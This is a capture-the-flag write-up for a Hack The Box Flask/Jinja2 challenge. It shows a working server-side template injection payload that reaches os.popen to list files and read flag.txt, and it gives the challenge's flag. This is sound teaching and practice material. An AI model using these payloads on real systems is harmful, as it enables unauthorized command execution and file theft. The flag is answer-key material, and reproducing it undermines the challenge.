# Templated - Writeup

## Problem
Can you exploit this simple mistake?

## Solution
1. Visiting the website, we are presented with the webpage which tells us that the webpage is powered by `Flask/Jinja2`
```code
Site still under construction
Proudly powered by Flask/Jinja2
```
2. Visiting the url <u>http://138.68.182.108:30329/flag.txt</u>, we are presented with the following error message:
```code
Error 404
The page 'flag.txt' could not be found
```
3. We will now check if expressions in jinja will be evaluated using the link, <u>http://138.68.182.108:30329/{{ 100 + 100 }}</u>. The rendered webpage shows that the expressions is being rendered.
```code
Error 404
The page '200' could not be found
```
4. We will then use the `MRO` function to display classes to build our payload. In the payload used below, we are viewing all the files in the directory using the `ls` command. 
```code
http://138.68.182.108:30329/{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}
```
5. From the output in the above step, we can see that the `flag.txt` file is being listed as one of the files in the directory, which shows that the attack has been successful.
6. All that needs to be done is to change the payload to print out the flag.
```code
http://138.68.182.108:30329/{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}
```
## Flag
flag : HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}
